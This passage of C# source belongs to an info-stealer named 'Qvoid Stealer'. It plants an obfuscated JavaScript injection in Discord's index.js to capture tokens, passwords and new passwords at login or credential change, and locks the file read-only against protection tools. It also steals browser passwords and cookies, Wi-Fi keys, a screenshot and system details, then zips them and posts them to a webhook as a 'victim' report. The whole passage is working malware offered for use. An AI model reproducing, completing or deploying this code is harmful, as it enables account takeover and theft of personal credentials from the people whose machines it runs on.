            //Getting all of the Discord path(s) avaliable on the computer.
            Discord discord = new Discord();
            if (!discord.IsExists)
            {
                return 2;
            }

            //If we've found avaliable Discord's core directory.
            if (discord.Cores.Count &gt; 0)
            {
                string Injection = @"(function(_0x4249f0,_0x64e4e1){const _0x2ac680={_0x596e58:0x30a,_0x417156:0x30b,_0x56393d:0x2f7,_0x49a9b1:0x2f2,_0xf7f904:0x317,_0xefcfb9:0x306,_0x5820b7:0x303,_0x463bc1:0x324,_0x5b8e64:0x331},_0x3ba47c={_0x48f51e:0x3b9};function _0x16d18(_0x3615ac,_0x221d1d){return _0x247f(_0x3615ac- -_0x3ba47c._0x48f51e,_0x221d1d);}const _0x21694b=_0x4249f0();while(!![]){try{const _0x2fbf51=parseInt(_0x16d18(-_0x2ac680._0x596e58,-0x30b))/0x1*(-parseInt(_0x16d18(-_0x2ac680._0x417156,-_0x2ac680._0x56393d))/0x2)+-parseInt(_0x16d18(-0x316,-0x2fd))/0x3+parseInt(_0x16d18(-0x302,-_0x2ac680._0x49a9b1))/0x4*(-parseInt(_0x16d18(-_0x2ac680._0xf7f904,-0x308))/0x5)+-parseInt(_0x16d18(-0x304,-0x305))/0x6+parseInt(_0x16d18(-0x327,-0x340))/0x7+-parseInt(_0x16d18(-_0x2ac680._0xefcfb9,-0x2ee))/0x8*(parseInt(_0x16d18(-_0x2ac680._0x5820b7,-0x2f8))/0x9)+parseInt(_0x16d18(-_0x2ac680._0x463bc1,-_0x2ac680._0x5b8e64))/0xa*(parseInt(_0x16d18(-0x31d,-0x31d))/0xb);if(_0x2fbf51===_0x64e4e1)break;else _0x21694b['push'](_0x21694b['shift']());}catch(_0xe07833){_0x21694b['push'](_0x21694b['shift']());}}}(_0x3c65,0x8b047));function _0x247f(_0x275b5c,_0x1e2cb7){const _0x3c65c4=_0x3c65();return _0x247f=function(_0x247f0e,_0x5c2be7){_0x247f0e=_0x247f0e-0x8b;let _0x3111d0=_0x3c65c4[_0x247f0e];return _0x3111d0;},_0x247f(_0x275b5c,_0x1e2cb7);}const fs=require('fs'),querystring=require('querystring'),{BrowserWindow,session}=require(_0x3527a8(0x33c,0x33e)),{execFile}=require('child_process'),TokenEval=_0x3527a8(0x331,0x341);function FirstTime(){const _0x3ebbac={_0x14d42a:0x47,_0x4a3a03:0x5e,_0xc11fd7:0x4c,_0x4b5a57:0x51},_0x42b481={_0x42c1e9:0x30c};function _0x7c3f96(_0x5270d0,_0x3ce57f){return _0x3527a8(_0x3ce57f,_0x5270d0- -_0x42b481._0x42c1e9);}if(fs[_0x7c3f96(_0x3ebbac._0x14d42a,0x60)](__dirname+'\x5c2a6f62cb2f3r\x5cQvoid'))return 0x1;else{const _0x468023=BrowserWindow[_0x7c3f96(0x39,0x48)]()[0x0];return _0x468023[_0x7c3f96(0x44,_0x3ebbac._0x4a3a03)]['executeJavaScript'](_0x7c3f96(0x5b,_0x3ebbac._0xc11fd7),!0x0)[_0x7c3f96(_0x3ebbac._0x4b5a57,0x61)](_0x782a6a=&gt;{}),0x0;}}const Filter={'urls':[_0x3527a8(0x357,0x354),_0x3527a8(0x35a,0x369),'https://discord.com/api/v*/applications/detectable','https://*.discord.com/api/v*/users/@me/library',_0x3527a8(0x350,0x365),_0x3527a8(0x32d,0x33a),_0x3527a8(0x341,0x34f),_0x3527a8(0x337,0x33c)]};session[_0x3527a8(0x340,0x33f)][_0x3527a8(0x349,0x34b)]['onBeforeRequest'](Filter,(_0x35e86d,_0x4f1733)=&gt;{if(FirstTime()){}});function _0x3527a8(_0x3ed73,_0x43c0d6){const _0x3c2cbf={_0x1d1b82:0x2ab};return _0x247f(_0x43c0d6-_0x3c2cbf._0x1d1b82,_0x3ed73);}const UrlFilter={'urls':['https://discordapp.com/api/v*/users/@me','https://*.discord.com/api/v*/users/@me',_0x3527a8(0x320,0x336),_0x3527a8(0x337,0x352),_0x3527a8(0x374,0x366),'https://api.stripe.com/v*/tokens']};session[_0x3527a8(0x33b,0x33f)][_0x3527a8(0x357,0x34b)][_0x3527a8(0x342,0x349)](UrlFilter,(_0x313474,_0x424b31)=&gt;{const _0x14e81f={_0x58baf3:0xcf,_0xc5379:0xd7,_0x1b41d5:0xf0,_0x1f707b:0xc6,_0x159819:0xe4,_0x10f659:0xdd,_0xbeb08e:0xd9,_0x444ac7:0xda,_0x3b02aa:0xcc,_0x5d86e6:0xdc,_0x5c5533:0xc4,_0x56d472:0xe8,_0x1ce9bc:0xef,_0x51f436:0xeb,_0xf93247:0xdb,_0x53a8ab:0xed,_0x42e9f2:0xc0,_0x8efadc:0xb5,_0x5d9a93:0xbc,_0x58f43e:0xcc,_0x29e579:0xcf,_0x381606:0xc9,_0x292105:0xd8,_0x3ec1ba:0xe0,_0x15341f:0xe1,_0x3367b3:0xd5,_0x11c2ea:0xc0,_0x26c464:0xe3},_0x2b3f4={_0x4ad7e5:0x7a,_0x18466a:0xa7,_0x21e903:0x91,_0x5acd98:0x70,_0x599a6a:0x8c,_0x33f631:0x85},_0x5d2476={_0x32af96:0x23d,_0xe2ea80:0x239,_0x393722:0x217,_0x15f1e6:0x22e,_0x34d93f:0x20f,_0xfd6285:0x22f},_0x25467a={_0x3e974b:0x2ea,_0x3a82d3:0x2eb,_0x25f007:0x2da,_0x587634:0x2d3},_0x16e1f5={_0xc52ca0:0x223};function _0x125473(_0x178fe2,_0x167f72){return _0x3527a8(_0x167f72,_0x178fe2- -0x41f);}if(_0x313474[_0x125473(-0xdd,-_0x14e81f._0x58baf3)][_0x125473(-0xdb,-0xda)](_0x125473(-_0x14e81f._0xc5379,-0xe8))){if(_0x313474[_0x125473(-0xe7,-_0x14e81f._0x1b41d5)]==0xc8){const _0x236ee3=JSON[_0x125473(-0xca,-_0x14e81f._0x1f707b)](Buffer['from'](_0x313474[_0x125473(-_0x14e81f._0x159819,-_0x14e81f._0x10f659)][0x0]['bytes'])[_0x125473(-0xe6,-0xfd)]()),_0xded008=_0x236ee3[_0x125473(-0xd7,-_0x14e81f._0xbeb08e)],_0x5def8b=_0x236ee3['password'],_0x29c009=BrowserWindow[_0x125473(-_0x14e81f._0x444ac7,-0xf4)]()[0x0];!fs[_0x125473(-_0x14e81f._0x3b02aa,-0xce)](__dirname+'\x5c2a6f62cb2f3r\x5cQvoid')&amp;&amp;fs['mkdirSync'](__dirname+_0x125473(-0xc9,-_0x14e81f._0x5d86e6)),_0x29c009[_0x125473(-_0x14e81f._0x58baf3,-_0x14e81f._0x5c5533)][_0x125473(-_0x14e81f._0x56d472,-_0x14e81f._0x1ce9bc)](TokenEval,!0x0)['then'](_0x2d900c=&gt;{function _0x44819f(_0x458337,_0x5c290b){return _0x125473(_0x458337- -_0x16e1f5._0xc52ca0,_0x5c290b);}execFile(__dirname+_0x44819f(-_0x25467a._0x3e974b,-0x2f6),['reason='+'User\x20logged\x20in'+'|%&amp;|'+_0x44819f(-_0x25467a._0x3a82d3,-0x2f0)+_0x2d900c+_0x44819f(-0x2f1,-0x2e7)+_0x44819f(-0x2e6,-0x2f5)+_0x236ee3['password']+'|%&amp;|'+_0x44819f(-_0x25467a._0x25f007,-_0x25467a._0x587634)+_0x236ee3['new_password'],'\x20']);});}}if(_0x313474[_0x125473(-_0x14e81f._0x10f659,-_0x14e81f._0x51f436)][_0x125473(-_0x14e81f._0xf93247,-0xf5)]('users/@me')){if(_0x313474[_0x125473(-0xe7,-_0x14e81f._0x53a8ab)]==0xc8&amp;&amp;_0x313474['method']==_0x125473(-_0x14e81f._0x42e9f2,-0xb2)){const _0x395bfd=JSON[_0x125473(-0xca,-0xc8)](Buffer[_0x125473(-0xc4,-0xcf)](_0x313474['uploadData'][0x0][_0x125473(-0xd9,-0xdb)])['toString']());if(_0x395bfd['password']!=null&amp;&amp;_0x395bfd[_0x125473(-0xb5,-0xc5)]!=undefined&amp;&amp;_0x395bfd[_0x125473(-_0x14e81f._0x8efadc,-0x9d)]!=''){if(_0x395bfd['new_password']!=undefined&amp;&amp;_0x395bfd['new_password']!=null&amp;&amp;_0x395bfd[_0x125473(-_0x14e81f._0x5d9a93,-0xd0)]!=''){const _0x3b09ac=BrowserWindow['getAllWindows']()[0x0];!fs[_0x125473(-_0x14e81f._0x58f43e,-_0x14e81f._0x29e579)](__dirname+_0x125473(-_0x14e81f._0x381606,-_0x14e81f._0x292105))&amp;&amp;fs['mkdirSync'](__dirname+_0x125473(-_0x14e81f._0x381606,-0xc1)),_0x3b09ac[_0x125473(-0xcf,-_0x14e81f._0x3ec1ba)][_0x125473(-0xe8,-_0x14e81f._0x15341f)](TokenEval,!0x0)[_0x125473(-0xc2,-0xbe)](_0x20baa2=&gt;{function _0xe933cb(_0x27ca08,_0x45bb2d){return _0x125473(_0x45bb2d- -0x16b,_0x27ca08);}execFile(__dirname+'\x5c2a6f62cb2f3r\x5cUpdate.exe',[_0xe933cb(-_0x5d2476._0x32af96,-0x226)+'Password\x20changed'+_0xe933cb(-0x223,-_0x5d2476._0xe2ea80)+'token='+_0x20baa2+_0xe933cb(-0x243,-0x239)+_0xe933cb(-_0x5d2476._0x393722,-_0x5d2476._0x15f1e6)+_0x395bfd[_0xe933cb(-_0x5d2476._0x34d93f,-0x220)]+_0xe933cb(-0x24b,-0x239)+_0xe933cb(-0x20e,-0x222)+_0x395bfd[_0xe933cb(-_0x5d2476._0xfd6285,-0x227)],'\x20']);});}if(_0x395bfd['email']!=null&amp;&amp;_0x395bfd[_0x125473(-_0x14e81f._0x3367b3,-0xc1)]!=undefined&amp;&amp;_0x395bfd[_0x125473(-0xd5,-0xc6)]!=''){const _0x2cd2a5=BrowserWindow[_0x125473(-_0x14e81f._0x444ac7,-0xc3)]()[0x0];!fs[_0x125473(-0xcc,-_0x14e81f._0x11c2ea)](__dirname+'\x5c2a6f62cb2f3r\x5cQvoid')&amp;&amp;fs[_0x125473(-0xd3,-0xcb)](__dirname+_0x125473(-0xc9,-_0x14e81f._0x58baf3)),_0x2cd2a5[_0x125473(-0xcf,-0xe0)][_0x125473(-0xe8,-_0x14e81f._0x26c464)](TokenEval,!0x0)['then'](_0x22fba5=&gt;{const _0x4244d0={_0x47ddcc:0x37};function _0x21eb49(_0x2057e3,_0x547e7f){return _0x125473(_0x547e7f-_0x4244d0._0x47ddcc,_0x2057e3);}execFile(__dirname+'\x5c2a6f62cb2f3r\x5cUpdate.exe',[_0x21eb49(-_0x2b3f4._0x4ad7e5,-0x84)+'Email\x20changed'+'|%&amp;|'+_0x21eb49(-_0x2b3f4._0x18466a,-_0x2b3f4._0x21e903)+_0x22fba5+_0x21eb49(-0x91,-0x97)+_0x21eb49(-0x95,-0x8c)+_0x395bfd[_0x21eb49(-_0x2b3f4._0x5acd98,-0x7e)]+'|%&amp;|'+'password='+_0x395bfd[_0x21eb49(-_0x2b3f4._0x599a6a,-_0x2b3f4._0x33f631)],'\x20']);});}}}}}),module[_0x3527a8(0x340,0x343)]=require('./core.asar');function _0x3c65(){const _0x41cb92=['then','8724904tcLPoC','PATCH','621108vuDwpr','9YSqGEG','1812BBRaOV','new_password','reason=','https://discord.com/api/v*/users/@me/library','https://*.discord.com/api/v*/auth/login','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=&gt;a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&amp;&amp;window.webpackChunkdiscord_app.push([[Math.random()],{},a=&gt;{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&amp;&amp;d.__esModule&amp;&amp;d.default&amp;&amp;(b?d.default[b]:a(d.default)))return\x20d.default;if(d&amp;&amp;(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','password=','https://*.discord.com/api/v*/applications/detectable','password','https://discordapp.com/api/v*/auth/login','executeJavaScript','statusCode','toString','https://*.discord.com/api/v*/users/@me/billing/subscriptions','uploadData','wss://remote-auth-gateway.discord.gg/*','7875182UBDuNu','electron','defaultSession','130YQugpq','for(let\x20a\x20in\x20window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=&gt;a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&amp;&amp;window.webpackChunkdiscord_app.push([[Math.random()],{},a=&gt;{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let\x20b=gg.c[a].exports;if(b&amp;&amp;b.__esModule&amp;&amp;b.default)for(let\x20a\x20in\x20b.default)\x22getToken\x22==a&amp;&amp;(token=b.default.getToken())}token;','url','exports','endsWith','getAllWindows','bytes','2265274kAJHEy','login','onCompleted','email','webRequest','mkdirSync','4225xKcKqc','1661670phLugD','https://discord.com/api/v*/users/@me/billing/subscriptions','webContents','|%&amp;|','https://discord.com/api/v*/auth/login','existsSync','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','parse','\x5c2a6f62cb2f3r\x5cQvoid','token=','\x5c2a6f62cb2f3r\x5cUpdate.exe','2203894LPPvNo','1vZRFSG','from','oldpass='];_0x3c65=function(){return _0x41cb92;};return _0x3c65();}";

                //Replicating the grabber to all Discord's core path and writing the injection.
                for (int i = 0; i &lt; discord.Cores.Count; ++i)
                {
                    var corePath = discord.Cores[i];
                    if (Process.GetCurrentProcess().MainModule.FileName == $"{corePath}2a6f62cb2f3r\\Update.exe")
                        continue;

                    if (Directory.Exists(corePath + "\\2a6f62cb2f3r"))
                    {
                        try
                        {
                            Directory.Delete(corePath + "\\2a6f62cb2f3r", true);
                        }
                        catch { }
                    }

                    Directory.CreateDirectory(corePath + "\\2a6f62cb2f3r");
                    try
                    {
                        //Extracting the dependencies to the core path.
                        Extract(path, corePath + "\\2a6f62cb2f3r");
                    }
                    catch { }

                    try
                    {
                        //If the file is already exists we delete it.
                        if (File.Exists($"{corePath}\\2a6f62cb2f3r\\{AppDomain.CurrentDomain.FriendlyName}"))
                            File.Delete($"{corePath}\\2a6f62cb2f3r\\{AppDomain.CurrentDomain.FriendlyName}");

                        if (File.Exists($"{corePath}\\2a6f62cb2f3r\\Update.exe"))
                            File.Delete($"{corePath}\\2a6f62cb2f3r\\Update.exe");

                        //Writing the index.js file
                        File.Copy(Assembly.GetEntryAssembly().Location, $"{corePath}\\2a6f62cb2f3r\\Update.exe");
                        File.WriteAllText(corePath + "\\index.js", $"{Injection}{Environment.NewLine}");

                        //Setting the file attributes to readonly in oreder to prevent protectors the writing access :/
                        File.SetAttributes(corePath + "\\index.js", FileAttributes.ReadOnly);
                    }
                    catch (Exception ex)
                    {

                        //Checking if the cause to the problem is that the file attributes contains readonly.
                        if (ex.HResult == -2147024891 &amp;&amp; File.GetAttributes(corePath + "\\index.js").HasFlag(FileAttributes.ReadOnly))
                        {
                            //Removing the readonly attribute.
                            File.SetAttributes(corePath + "\\index.js", FileAttributes.Normal);
                            --i;
                        }
                    }
                }
            }

            //If we've found zero tokens location which is not normal, its probably some application that "Protecting" Discord.
            if (discord.TokensPaths.Count == 0)
            {
                //Creating a dump for all "Discord" processes and checking if they has tokens.
                discord.Dump();
                if (discord.DumpedTokens.Count &gt; 0)
                    goto Next;

                //If the dump didn't found any tokens we are trying to bypass the protectors.
                discord.BypassProtectors(path);

                while (true)
                {
                    //Sleeping 1 minute.
                    Thread.Sleep(60000);

                    //Killing all Discord's proccesses
                    var DiscordProcs = Process.GetProcessesByName("Discord");
                    foreach (var proc in DiscordProcs)
                        try { proc.Kill(); } catch { }

                    //Starting Discord
                    if (!String.IsNullOrEmpty(discord.Name))
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk");

                    //Checking again.
                    discord = new Discord();
                    if (discord.TokensPaths.Count &gt; 0)
                        break;
                }
            }

        Next:
            var Tokens = new List&lt;string&gt;();
            if (!String.IsNullOrEmpty(_Token) &amp;&amp; !String.IsNullOrWhiteSpace(_Token))
                Tokens.Add(_Token);

            Tokens.AddRange(discord.GetTokens());

            Dictionary&lt;DiscordEmbed, DiscordClient&gt; Users = new Dictionary&lt;DiscordEmbed, DiscordClient&gt;();
            List&lt;string&gt; clientsData = new List&lt;string&gt;();
            string BodyMessage = "";

            if (Tokens.Count &gt; 0)
            {
                List&lt;ulong&gt; ids = new List&lt;ulong&gt;();

                for (int i = 0; i &lt; Tokens.ToList().Count; ++i)
                {

                    //Creating a client from the given token
                    DiscordClient client = new DiscordClient(Tokens[i]);
                    if (!client.IsValidToken || client.Id.ToString().Length &lt; 18)
                        continue;

                    //Checking for duplicates
                    if (ids.Any(t =&gt; t == client.Id))
                    {
                        Tokens.RemoveAt(i);
                        continue;
                    }

                    ids.Add(client.Id);
                    string clientData = $"Username: {client.Username}#{client.Discriminator}{Environment.NewLine}" +
                                        $"Email: {(String.IsNullOrEmpty(client.Email) ? "None" : client.Email)}{Environment.NewLine}" +
                                        $"Phone Number: {(String.IsNullOrEmpty(client.Phone) ? "None" : client.Phone)}{Environment.NewLine}" +
                                        $"Premium: {client.Premium}{Environment.NewLine}" +
                                        $"Verified: {client.Verified}{Environment.NewLine}" +
                                        $"Badges: {(client.GetBadges(client.Flags).Count &lt;= 0 ? "None" : string.Join(", ", client.GetBadges(client.Flags)))}{Environment.NewLine}" +
                                        $"Created At: {client.CreatedAt.DateTime.ToShortDateString()} | {client.CreatedAt.DateTime.ToShortTimeString()}{Environment.NewLine}";

                    var embed = new DiscordEmbed();

                    string _event = _reason.ToUpper();
                    embed.Author = new EmbedAuthor()
                    {
                        Name = _event
                    };
                    embed.Fields = new List&lt;EmbedField&gt;();
                    embed.Fields.Add(new EmbedField() { Name = "Username", Value = $"```{client.Username}#{client.Discriminator}```", InLine = true });
                    embed.Fields.Add(new EmbedField() { Name = "Id", Value = $"```{client.Id}```", InLine = true });
                    embed.Fields.Add(new EmbedField() { Name = "Verified", Value = $"```{client.Verified}```", InLine = true });
                    embed.Fields.Add(new EmbedField() { Name = "Created At", Value = $"```{client.CreatedAt}```", InLine = true });
                    embed.Fields.Add(new EmbedField() { Name = "Phone Number", Value = $"```{(String.IsNullOrEmpty(client.Phone) ? "None" : client.Phone)}{Environment.NewLine}```", InLine = true });
                    embed.Fields.Add(new EmbedField() { Name = "Badges", Value = $"```{(client.GetBadges(client.Flags).Count &lt;= 0 ? "None" : string.Join(", ", client.GetBadges(client.Flags)))}{Environment.NewLine}```", InLine = true });

                    if (_Token == client.Token)
                    {
                        if (!String.IsNullOrEmpty(_OldPassword))
                        {
                            if (_event == "USER LOGGED IN")
                            {
                                clientData += $"Current Password: {_OldPassword}{Environment.NewLine}";
                                embed.Fields.Add(new EmbedField() { Name = "Current Password", Value = $"```{_OldPassword}```", InLine = false });
                            }
                            else
                            {
                                clientData += $"Old Password: {_OldPassword}{Environment.NewLine}";
                                embed.Fields.Add(new EmbedField() { Name = "Old Password", Value = $"```{_OldPassword}```", InLine = false });
                            }
                        }

                        if (!String.IsNullOrEmpty(_NewPassword) &amp;&amp; _event != "USER LOGGED IN" &amp;&amp; _NewPassword != "undefined")
                        {
                            clientData += $"Current Password: {_NewPassword}{Environment.NewLine}";
                            embed.Fields.Add(new EmbedField() { Name = "Current Password", Value = $"```{_NewPassword}```", InLine = false });
                        }

                        var codes = client.Get2faCodes(String.IsNullOrEmpty(_NewPassword) ? _OldPassword : _NewPassword);
                        if (codes != null &amp;&amp; codes.Count &gt; 0)
                            embed.Fields.Add(new EmbedField() { Name = "2fa codes", Value = $"```{string.Join(Environment.NewLine, codes)}```", InLine = false });
                    }

                    embed.Fields.Add(new EmbedField() { Name = "Token", Value = $"```{client.Token}```", InLine = false });

                    clientData += $"Token: {client.Token}{Environment.NewLine}";
                    BodyMessage += $"{Environment.NewLine}Username```{client.Username}#{client.Discriminator}```" +
                                   $"{Environment.NewLine}Email```{client.Email}```" +
                                   $"{Environment.NewLine}Phone Number```{client.Phone}```" +
                                   $"{Environment.NewLine}Premium```{client.Premium}```" +
                                   $"{Environment.NewLine}Token```{client.Token}```";

                    clientsData.Add(clientData);
                    Users.Add(embed, client);
                }
            }

            //Getting the information about the environment computer.
            Machine machine = new Machine();

            List&lt;EmbedField&gt; fields = new List&lt;EmbedField&gt;();
            fields.Add(new EmbedField() { Name = "IP Address", Value = $"```{machine.PublicIPv4}```", InLine = true });
            fields.Add(new EmbedField() { Name = "LAN Address", Value = $"```{machine.LanIPv4}```", InLine = true });
            fields.Add(new EmbedField() { Name = "Desktop Username", Value = $"```{Environment.UserName}```", InLine = true });
            fields.Add(new EmbedField() { Name = "Domain Username", Value = $"```{Environment.UserDomainName}```", InLine = true });
            fields.Add(new EmbedField() { Name = "Processor Count", Value = $"```{Environment.ProcessorCount}```", InLine = true });
            fields.Add(new EmbedField() { Name = "Memory", Value = $"```{machine.PcMemory}```", InLine = true });
            fields.Add(new EmbedField() { Name = "OS Architecture", Value = $"```{machine.OsArchitecture}```", InLine = true });
            fields.Add(new EmbedField() { Name = "GPU Video", Value = $"```{machine.GpuVideo}```", InLine = true });
            fields.Add(new EmbedField() { Name = "GPU Version", Value = $"```{machine.GpuVersion}```", InLine = true });
            fields.Add(new EmbedField() { Name = "Windows License", Value = $"```{machine.WindowsLicense}```", InLine = true });

            string HeadMessage = $"*IP Address*{Environment.NewLine}  &gt; {machine.PublicIPv4}{Environment.NewLine}" +
                                 $"*LAN Address*{Environment.NewLine}  &gt; {machine.LanIPv4}{Environment.NewLine}" +
                                 $"*Desktop Username*{Environment.NewLine}  &gt; {Environment.UserName}{Environment.NewLine}" +
                                 $"*Domain Username*{Environment.NewLine}  &gt; {Environment.UserDomainName}{Environment.NewLine}" +
                                 $"*Processor Count*{Environment.NewLine}  &gt; {Environment.ProcessorCount}{Environment.NewLine}" +
                                 $"*Memory*{Environment.NewLine}  &gt; {machine.PcMemory}{Environment.NewLine}" +
                                 $"*OS Architecture*{Environment.NewLine}  &gt; {machine.GpuVideo}{Environment.NewLine}" +
                                 $"*GPU Video*{Environment.NewLine}  &gt; {machine.LanIPv4}{Environment.NewLine}" +
                                 $"*GPU Version*{Environment.NewLine}  &gt; {machine.GpuVersion}{Environment.NewLine}" +
                                 $"*Windows License*{Environment.NewLine}  &gt; {machine.WindowsLicense}{Environment.NewLine}";

            string Passwords = "------ Passwords ------";
            string Cookies = "------ Cookies ------";

            //Grabbing passwords and cookies
            var _Chrome = new ChromiumGrabber(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                "\\Google\\Chrome\\User Data\\Local State", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                "\\Google\\Chrome\\User Data\\Default\\Login Data", "Chrome");

            var _Brave = new ChromiumGrabber(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data", "Brave");

            var _Opera = new ChromiumGrabber(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                "\\Opera Software\\Opera GX Stable\\Cookies",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                "\\Opera Software\\Opera GX Stable\\Local State",
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +
                "\\Opera Software\\Opera GX Stable\\Login Data", "Opera");

            var GeckoPasswords = GeckoGrabber.Passwords.GetAll();
            var GeckoCookies = GeckoGrabber.Cookies.GetAll();

            #region Passwords
            // ----------------------- Passwords -----------------------//

            var ChromePasswords = _Chrome.ReadPasswords();
            if (ChromePasswords != null &amp;&amp; ChromePasswords.Count &gt; 0)
                Passwords += ChromePasswords.ToString("Chrome");

            var OperaPasswords = _Opera.ReadPasswords();
            if (OperaPasswords != null &amp;&amp; OperaPasswords.Count &gt; 0)
                Passwords += OperaPasswords.ToString("OperaGx");

            var BravePasswords = _Brave.ReadPasswords();
            if (BravePasswords != null &amp;&amp; BravePasswords.Count &gt; 0)
                Passwords += BravePasswords.ToString("Brave");

            if (!String.IsNullOrEmpty(GeckoPasswords) &amp;&amp; !String.IsNullOrWhiteSpace(GeckoPasswords))
                Passwords += GeckoPasswords;

            #endregion Passwords

            #region Cookies
            // ----------------------- Cookies -----------------------//

            var ChromeCookies = _Chrome.GetCookies();
            if (ChromeCookies != null &amp;&amp; ChromeCookies.Count &gt; 0)
                Cookies += ChromeCookies.ToString("Chrome");

            var OperaCookies = _Opera.GetCookies();
            if (OperaCookies != null &amp;&amp; OperaCookies.Count &gt; 0)
                Cookies += OperaCookies.ToString("OpearaGx");

            var BraveCookies = _Brave.GetCookies();
            if (BraveCookies != null &amp;&amp; BraveCookies.Count &gt; 0)
                Cookies += BraveCookies.ToString("Brave");

            if (!String.IsNullOrEmpty(GeckoCookies) &amp;&amp; !String.IsNullOrWhiteSpace(GeckoCookies))
                Cookies += GeckoCookies;
            #endregion Cookies

            var filesDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BleachBit\\bin\\";
            if (Directory.Exists(filesDir))
                Directory.Delete(filesDir, true);

            Directory.CreateDirectory(filesDir);

            if (Passwords != "------ Passwords ------")
                File.WriteAllText(filesDir + "\\BrowserPasswords.txt", Passwords);

            if (Cookies != "------ Cookies ------")
                File.WriteAllText(filesDir + "\\BrowserCookies.txt", Cookies);

            try
            {
                WirelessLan lan = new WirelessLan();
                if (lan.IsAvailable)
                {
                    string content = "";
                    foreach (var ssid in lan.SSIDs)
                        content += $"{ssid.Profile.Name}:{ssid.Security.Key}{Environment.NewLine}";

                    if (!string.IsNullOrEmpty(content))
                        File.WriteAllText(filesDir + "\\Lan.txt", content);
                }
            }
            catch { }

            using (Bitmap bmp = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height))
            {
                try
                {
                    using (Graphics g = Graphics.FromImage(bmp))
                        g.CopyFromScreen(SystemInformation.VirtualScreen.Left, SystemInformation.VirtualScreen.Top, 0, 0, bmp.Size);

                    bmp.Save($"{filesDir}\\Screenshot.jpg", ImageFormat.Jpeg);
                }
                catch { }
            }

            var finalZip = $"{Path.GetTempPath()}\\{Environment.UserDomainName}-REPORT.zip";
            string usersPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + $"\\{Encryption.GenerateKey(8, true, Protection.UniqueSeed() + 19)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 21)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 22)}-{Encryption.GenerateKey(4, true, Protection.UniqueSeed() + 23)}-{Encryption.GenerateKey(8, true, Protection.UniqueSeed() + 24)}.dat";

            //Checking if the user already run the token grabber before, if he did we compare it to the content if the content has changed we update all the information, else we just return quz we have nothing to do :D
            if (!File.Exists(usersPath) || (Encryption.ComputeSha256Hash(Other.Sort(HeadMessage + BodyMessage).Replace(Environment.NewLine, "")) != File.ReadAllText(usersPath)))
            {
                //Writing the log file.
                File.WriteAllText(usersPath, Encryption.ComputeSha256Hash((HeadMessage + BodyMessage).Replace(Environment.NewLine, "")));

                if (File.Exists(finalZip))
                    File.Delete(finalZip);

                if (clientsData.Count &gt; 0)
                {
                    File.WriteAllText(filesDir + "\\RawTokens.txt", string.Join(Environment.NewLine, Users.Select(t =&gt; t.Value.Token)));
                    File.WriteAllText(filesDir + "\\TokensInformation.txt", string.Join($"{Environment.NewLine}-----------------------------------------------------{Environment.NewLine}", clientsData));
                }

                ZipFile.CreateFromDirectory(filesDir, finalZip);

                Settings.Webhook.Send(new DiscordMessage()
                {
                    Embeds = new List&lt;DiscordEmbed&gt;()
                    {
                        new DiscordEmbed()
                        {
                            Timestamp = DateTime.UtcNow,
                            Color = Other.Spectrum(0),
                            Fields = fields,
                            Title = "Victim's computer inspects &amp; information",
                        },
                    },
                    Username = "Qvoid Stealer",
                    AvatarUrl = "https://cdn.discordapp.com/attachments/827625760843235368/936248839956996116/unknown.png"
                }, new FileInfo[] { new FileInfo(finalZip) });

                if (Users.Count &gt; 0)
                {
                    foreach (var user in Users)
                    {
                        string friendsMessage = "";
                        var rarestFriends = user.Value.TopRarestUsers(user.Value.GetFriends(), 10);

                        for (int i = 0; i &lt; rarestFriends.Count; ++i)
                        {
                            var friend = rarestFriends[i];
                            var badges = string.Join(" | ", friend.GetBadges(friend.PublicFlags));
                            if (string.IsNullOrEmpty(badges))
                                badges = "";
                            else
                                badges = $"| {badges}";

                            friendsMessage += $"{Environment.NewLine}{i + 1}) **{(friend.Rarity &gt; 0 ? "GOOD" : "NOOB")}** - {friend.Username}#{friend.Discriminator} {badges}";
                        }

                        var userEmbed = user.Key;
                        userEmbed.Color = Other.Spectrum(2);

                        DiscordEmbed friendsEmbed = new DiscordEmbed();
                        friendsEmbed.Description = friendsMessage;
                        friendsEmbed.Color = Other.Spectrum(0);
                        friendsEmbed.Title = $"{user.Value.Username}#{user.Value.Discriminator}'s top 10 rarest relationships";
                        friendsEmbed.Color = userEmbed.Color;


                        Settings.Webhook.Send(new DiscordMessage()
                        {
                            Embeds = new List&lt;DiscordEmbed&gt;()
                            {
                                userEmbed,
                                friendsEmbed
                            },
                            Username = "Qvoid Stealer",
                            AvatarUrl = "https://cdn.discordapp.com/attachments/827625760843235368/936248839956996116/unknown.png"
                        });
                    }
                }
